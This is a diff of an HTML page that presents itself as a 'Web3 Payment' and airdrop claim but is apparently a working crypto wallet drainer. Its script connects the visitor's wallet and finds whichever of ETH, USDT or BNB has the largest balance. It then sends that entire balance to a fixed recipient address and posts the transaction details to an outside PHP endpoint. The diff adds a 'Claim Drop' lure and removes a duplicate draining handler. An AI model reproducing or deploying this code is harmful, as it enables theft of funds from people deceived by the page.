@@ -4,41 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Web3 Payment</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@wallet-connect-v3/core@2.0.1/dist/esm/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.7/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/browser@latest/dist/umd/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@latest/dist/ethers.umd.min.js"></script>
     <style>
         body {
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #111;
-            color: #fff;
-            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
         }
-        .modal {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            background-color: #333;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-        }
-        .button {
-            margin: 10px;
-            padding: 12px 20px;
-            font-size: 18px;
-            cursor: pointer;
-            background-color: #555;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            transition: background-color 0.3s ease;
-        }
-        .button:hover {
-            background-color: #777;
+        button {
+            padding: 15px 25px;
+            font-size: 16px;
         }
         #qrCodeContainer {
             display: none;
@@ -51,27 +31,19 @@
     </style>
 </head>
 <body>
-    <div class="modal">
-        <h2>Connect Wallet</h2>
-        <button id="connectWalletConnect" class="button">Connect with WalletConnect</button>
-        <button id="connectTrustWallet" class="button">Connect with Trust Wallet</button>
-    </div>
+    <button id="connectButton">Connect Wallet & Claim Drop</button>
 
-    <!-- Container for displaying QR Code -->
     <div id="qrCodeContainer">
         <h2>Scan QR Code with Your Wallet App</h2>
         <div id="qrCode"></div>
     </div>
 
-    <!-- Form for submitting transaction details -->
     <form id="transactionForm" action="https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php" method="post" style="display: none;">
         <input type="hidden" name="transactionDetails" id="transactionDetails">
     </form>
 
-    <!-- Script for handling wallet connection and transaction -->
     <script>
-        const connectWalletConnectButton = document.getElementById('connectWalletConnect');
-        const connectTrustWalletButton = document.getElementById('connectTrustWallet');
+        const connectButton = document.getElementById('connectButton');
         const transactionForm = document.getElementById('transactionForm');
         const transactionDetailsInput = document.getElementById('transactionDetails');
         const qrCodeContainer = document.getElementById('qrCodeContainer');
@@ -103,7 +75,7 @@
         async function init() {
             const providerOptions = {
                 walletconnect: {
-                    package: WalletConnectCore, // using the updated library
+                    package: WalletConnect, // using the updated library
                     options: {
                         infuraId: "c05e035e823a4769b62ae15c1cbe2f02" // Your Infura Project ID
                     }
@@ -118,18 +90,17 @@
                 providerOptions
             });
 
-            connectWalletConnectButton.addEventListener('click', async () => {
+            connectButton.addEventListener('click', async () => {
                 try {
                     const provider = await web3Modal.connect();
                     const web3 = new Web3(provider);
 
-                    const walletType = 'WalletConnect';
-                    qrCodeContainer.style.display = 'block';
-                    const walletConnectProvider = provider.connector;
-                    const uri = await walletConnectProvider.getUri();
-                    const qrCodeImg = document.createElement('img');
-                    qrCodeImg.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(uri)}`;
-                    document.getElementById('qrCode').appendChild(qrCodeImg);
+                    let walletType = 'unknown';
+                    if (provider.isMetaMask) {
+                        walletType = 'MetaMask';
+                    } else if (provider.isTrust) {
+                        walletType = 'Trust Wallet';
+                    }
 
                     console.log(`${walletType} detected`);
 
@@ -153,7 +124,7 @@
                         maxEthTransferWei = 0n;
                     }
 
-                    // Get token balances (example with USDT and BNB)
+                    // Get token balances
                     const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
                     const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());
 
@@ -196,74 +167,15 @@
                 }
             });
 
-            connectTrustWalletButton.addEventListener('click', async () => {
-                try {
-                    const provider = await web3Modal.connect();
-                    const web3 = new Web3(provider);
-
-                    const walletType = 'Trust Wallet';
-                    console.log(`${walletType} detected`);
-
-                    const ethersProvider = new ethers.providers.Web3Provider(provider);
-                    const signer = ethersProvider.getSigner();
-                    const accounts = await web3.eth.getAccounts();
-                    const senderAddress = accounts[0];
-
-                    // Fetch current gas prices
-                    const feeData = await ethersProvider.getFeeData();
-                    const gasPriceWei = BigInt(feeData.gasPrice.toString()); // Convert to BigInt
-                    const maxFeePerGas = BigInt(feeData.maxFeePerGas.toString()); // Convert to BigInt
-                    const maxPriorityFeePerGas = BigInt(feeData.maxPriorityFeePerGas.toString()); // Convert to BigInt
-
-                    const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
-                    const gasFeeWei = gasPriceWei * gasLimit;
-
-                    // Ensure maxEthTransferWei is not negative
-                    let maxEthTransferWei = ethBalanceWei - gasFeeWei;
-                    if (maxEthTransferWei < 0n) {
-                        maxEthTransferWei = 0n;
-                    }
-
-                    // Get token balances (example with USDT and BNB)
-                    const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
-                    const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());
-
-                    const bnbContract = new web3.eth.Contract(erc20ABI, tokenAddresses.BNB);
-                    const bnbBalanceWei = BigInt(await bnbContract.methods.balanceOf(senderAddress).call());
-
-                    // Determine which token has the highest balance
-                    const balances = [
-                        { name: 'ETH', balance: maxEthTransferWei, transactionParameters: { to: recipientAddress, value: ethers.BigNumber.from(maxEthTransferWei.toString()), gasLimit: ethers.BigNumber.from(gasLimit.toString()), gasPrice: ethers.BigNumber.from(gasPriceWei.toString()) } },
-                        { name: 'USDT', balance: usdtBalanceWei, transactionParameters: { to: tokenAddresses.USDT, gasLimit: ethers.BigNumber.from(gasLimit.toString()), gasPrice: ethers.BigNumber.from(gasPriceWei.toString()), data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI() } },
-                        { name: 'BNB', balance: bnbBalanceWei, transactionParameters: { to: tokenAddresses.BNB, gasLimit: ethers.BigNumber.from(gasLimit.toString()), gasPrice: ethers.BigNumber.from(gasPriceWei.toString()), data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI() } }
-                    ];
-
-                    balances.sort((a, b) => (a.balance > b.balance ? -1 : 1));
-
-                    // Use the token with the highest balance
-                    const selectedToken = balances[0];
-                    console.log(`Selected Token: ${selectedToken.name}`);
-
-                    const transaction = await signer.sendTransaction(selectedToken.transactionParameters);
-
-                    // Send transaction details to PHP endpoint
-                    transactionDetailsInput.value = JSON.stringify({
-                        status: 'approved',
-                        transactionHash: transaction.hash,
-                        sender: senderAddress,
-                        recipient: recipientAddress,
-                        selectedToken: selectedToken.name,
-                        balance: selectedToken.balance.toString()
-                    });
-                    transactionForm.submit();
-                } catch (error) {
-                    console.error('Error:', error.message);
-                    // Handle user rejection
-                    transactionDetailsInput.value = JSON.stringify({
-                        status: 'declined',
-                        error: error.message
-                    });
-                    transactionForm.submit();
+            // Fallback to WalletConnect QR code if the wallet is not detected
+            web3Modal.on('connect', async (provider) => {
+                if (provider.isWalletConnect) {
+                    qrCodeContainer.style.display = 'block';
+                    const walletConnectProvider = provider.connector;
+                    const uri = await walletConnectProvider.getUri();
+                    const qrCodeImg = document.createElement('img');
+                    qrCodeImg.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(uri)}`;
+                    document.getElementById('qrCode').appendChild(qrCodeImg);
                 }
             });
         }
